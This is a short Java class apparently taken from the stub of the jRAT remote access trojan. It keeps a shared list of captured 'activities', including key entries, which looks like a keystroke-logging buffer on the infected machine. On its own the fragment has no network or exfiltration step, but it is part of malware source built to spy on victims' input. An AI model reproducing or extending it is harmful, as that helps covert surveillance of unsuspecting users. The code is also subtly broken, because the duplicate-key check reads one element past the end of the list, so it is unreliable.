package pro.jrat.plugin.stub;

import java.util.ArrayList;
import java.util.List;

public class Activities {

	public static final boolean unix = System.getProperty("os.name").toLowerCase().contains("mac") || System.getProperty("os.name").toLowerCase().contains("linux");
	public static final List<Activity> activities = new ArrayList<Activity>();

	public static synchronized void add(Activity activity) {
		if (activity instanceof Key && unix && ((Key)activities.get(activities.size())).getKey() == (((Key)activity).getKey())) {
			return;
		}
		activities.add(activity);
	}
}
